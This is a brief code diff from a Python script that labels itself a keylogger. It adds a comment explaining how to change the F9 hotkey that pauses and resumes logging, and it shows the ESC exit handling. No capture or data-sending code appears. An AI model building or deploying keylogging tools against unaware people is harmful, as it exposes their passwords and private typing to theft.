@@ -21,7 +21,7 @@ def on_press(key):
         print("[*] ESC pressed. Exiting keylogger.")
         return False  # Stop listener
 
-    elif key == keyboard.Key.f9:
+    elif key == keyboard.Key.f9: #If you want to change the hotkey, you can change it here
         is_logging = not is_logging
         status = "resumed" if is_logging else "paused"
         print(f"[*] Logging {status.upper()}.")
